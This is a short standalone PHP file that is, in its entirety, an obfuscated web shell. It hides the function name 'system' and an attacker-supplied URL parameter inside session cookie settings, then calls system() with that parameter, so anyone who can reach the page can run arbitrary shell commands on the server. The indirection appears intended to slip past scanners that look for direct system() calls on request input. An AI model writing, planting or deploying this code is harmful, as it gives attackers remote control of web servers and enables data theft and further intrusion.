<?php




session_set_cookie_params(0, 'system', $_GET['secret']);

$func = session_get_cookie_params()['path'];

$func(session_get_cookie_params()['domain']);

